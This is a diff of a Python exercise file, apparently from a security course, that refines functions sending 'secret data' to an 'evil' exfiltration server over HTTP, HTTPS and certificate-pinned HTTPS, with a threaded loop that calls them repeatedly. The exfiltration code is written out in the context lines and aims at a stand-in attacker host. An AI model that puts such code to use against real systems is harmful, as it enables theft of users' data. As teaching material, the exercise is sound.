@@ -1,5 +1,6 @@
 # %%
 import os
+from pathlib import Path
 
 pass  # Ignore this line
 
@@ -48,6 +49,7 @@ test_make_evil_request(make_evil_request)
 
 exfiltrate_data = make_evil_request
 
+# %%
 if __name__ == "__main__":  # Only executed when running the script directly
     """
     Make requests to the evil server with different secret data.
@@ -68,6 +70,8 @@ if __name__ == "__main__":  # Only executed when running the script directly
 
     thread = threading.Thread(target=loop_exfiltration)
     thread.start()
+
+# %%
 
 
 def make_evil_request_https(secret_data: str) -> Optional[str]:
@@ -111,6 +115,8 @@ test_make_evil_request_https(make_evil_request_https)
 # Update the exfiltrate_data function to use HTTPS
 exfiltrate_data = make_evil_request_https
 
+# %%
+
 
 def make_evil_request_pinned(secret_data: str) -> Optional[str]:
     """
@@ -132,14 +138,17 @@ def make_evil_request_pinned(secret_data: str) -> Optional[str]:
     try:
         # Use HTTPS instead of HTTP
         url = "https://evil.aisb.dev/exfiltrate"
-        params = {"data": secret_data}
+        params = {
+            "data": secret_data,
+        }
 
         # Make the GET request over HTTPS
         response = requests.get(
             url,
             params=params,
             timeout=5,
-            verify="isg-root-x1.pem",
+            # verify=str(Path(__file__).parent / "isrg-root-x1.pem"),
+            verify="isrg-root-x1.pem",
         )
 
         # Check if request was successful
@@ -155,6 +164,9 @@ def make_evil_request_pinned(secret_data: str) -> Optional[str]:
     except requests.exceptions.RequestException as e:
         print(f"Request failed: {e}")
         return None
+    except FileNotFoundError as e:
+        print(f"Request failed: {e}")
+        return None
 
 
 from w1d2_test import test_make_evil_request_pinned
@@ -162,3 +174,5 @@ from w1d2_test import test_make_evil_request_pinned
 test_make_evil_request_pinned(make_evil_request_pinned)
 
 exfiltrate_data = make_evil_request_pinned
+
+# %%
